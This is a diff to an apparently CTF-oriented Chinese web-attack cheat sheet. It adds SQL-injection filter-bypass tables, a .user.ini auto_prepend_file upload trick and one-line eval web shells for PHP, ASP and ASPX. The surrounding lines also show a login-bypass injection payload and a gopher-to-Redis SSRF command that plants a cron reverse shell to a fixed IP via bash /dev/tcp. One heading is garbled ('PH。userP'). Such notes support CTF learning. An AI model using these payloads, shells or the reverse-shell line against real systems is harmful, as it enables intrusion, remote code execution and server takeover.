@@ -58,27 +58,13 @@
 
 # SQL注入
 
-### 简单注入
+## 绕过过滤
 
-联合查询
-
-宽字节
-
-Cookie
-
-大小写、双写
-
-### 花式绕WAF
-
-char,hex
-
-干扰字符 /特性
-
-白名单 spider
-
-### 二次注入
-
-写入数据库的时候，保留了原数据
+| 过滤                      | 绕过方法                                                     |
+| ------------------------- | ------------------------------------------------------------ |
+| 空格                      | /**/                                                         |
+| information_schema        | 1. 利用mysql5.7新增的sys.schema_auto_increment_columns，列有table_schema、table_name、column_name。2. sys.schema_table_statistics_with_buffer、 sys.schema_table_statistics、 sys.ps_schema_table_statistics_io，列有table_schema、table_name。3.  mysql.innodb_table_stats、 mysql.innodb_index_stats，列有database_name、table_name |
+| information_schema.tables | 反引号（`）                                                  |
 
 ## 基于布尔的盲注
 
@@ -206,7 +192,13 @@ payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollu
 因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row['password']的限制成功登陆。
 ```
 
-### SQLite
+## Mysql函数
+
+| 函数名称  | 作用                           |
+| --------- | ------------------------------ |
+| load_file | 查看文件内容，见ctf.show_web14 |
+|           |                                |
+|           |                                |
 
 
 
@@ -289,9 +281,20 @@ c\at fl\ag.txt
 
    curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%%0d%0a......**......'  
 
-## 文件上传
+# 文件上传
 
-# PHP
+## .user.ini
+
+PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
+在.user.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容。
+
+可以在a.txt中写入一句话木马等。
+
+见ctf.show_web13。
+
+
+
+# PH。userP
 
 ## 常用函数
 
@@ -562,3 +565,18 @@ index.php?s=index/think\App/invokeFunction&function=call_user_func_array&vars[0]
    ```
 
 7. 
+
+# 一句话木马
+
+```php
+<?php @eval($_POST['attack']);?>
+```
+
+```asp
+<%eval request ("pass")%>
+```
+
+```aspx
+<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
+```
+
